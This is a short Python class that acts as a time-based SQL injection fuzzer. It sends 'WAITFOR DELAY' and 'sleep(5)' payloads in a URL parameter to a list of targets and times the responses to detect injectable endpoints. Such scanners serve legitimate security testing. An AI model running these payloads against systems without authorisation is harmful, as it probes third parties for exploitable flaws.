import requests
import time

class TimeSQLFuzzer:
    def __init__(self):
        self.name = "Time-Based SQL Injection Fuzzer"
        self.payloads = [
            "'; WAITFOR DELAY '00:00:05'--",
            "1' OR IF(1=1, sleep(5), null) --"
        ]

    def run_tests(self, targets):
        results = {}
        for target in targets:
            for payload in self.payloads:
                response_time = self.measure_response_time(target, payload)
                results[f"{target} ({payload})"] = response_time
        return results

    def measure_response_time(self, url, payload):
        start_time = time.time()
        try:
            response = requests.get(f"{url}?input={payload}", timeout=10)
        except requests.exceptions.RequestException:
            return "ERROR"
        return f"{time.time() - start_time:.4f} sec"
